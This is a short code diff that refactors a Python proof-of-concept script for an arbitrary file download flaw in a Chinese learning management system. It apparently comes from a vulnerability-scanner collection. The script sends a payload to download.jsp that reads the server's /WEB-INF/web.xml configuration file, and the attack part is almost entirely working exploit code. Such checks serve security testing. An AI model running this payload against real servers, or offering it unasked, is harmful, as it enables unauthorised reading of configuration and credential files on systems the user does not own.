@@ -9,17 +9,10 @@ description: \www\cw\skin1\jsp\download.jsp源码中,未经过文件类型检查
 import sys
 import requests
 import warnings
-
-  
-
-class download_filedownload():
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['汇思学习管理系统任意文件下载','','']
         payload = "/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,5 @@ class download_filedownload():
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = download_filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
